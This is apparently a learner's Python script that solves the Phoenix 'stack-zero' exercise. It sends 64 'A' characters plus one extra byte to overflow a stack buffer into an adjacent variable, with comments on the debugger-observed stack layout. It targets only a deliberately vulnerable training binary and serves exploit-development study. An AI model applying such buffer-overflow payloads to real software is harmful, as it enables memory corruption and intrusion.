# Stack buffer overflow
import subprocess

# This first one is very basic demonstration of memory corruption.

# In the source code, a struct is created with a char[64] array and a volatile int after it.
# While debugging, I'm able to see sub rsp, 0x60 allocating local vars for main.
# The debugger shows that our volatile int is at rbp-0x10, while our char array is rbp-0x50

filepath = '/opt/phoenix/amd64/stack-zero'

proc = subprocess.Popen(filepath, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# If we were to fill more data than 64chars, then the stack pointer will proceed on
# to copy contents until it hits rbp-0x10 in our int memory.
# I = overrided memory

payload = 'A'*64 + 'I' + '\n'

outStream  = proc.stdout.readline()
print('Initial output:\n' + outStream.decode('utf-8'))
print('Sending payload: ' + payload)

outStream, errStream = proc.communicate(input=payload.encode('utf-8'))

if outStream:
    print('Output: \n' + outStream.decode('utf-8'))
else:
    print('Error with receiving the stdout stream')
    exit()

exit()
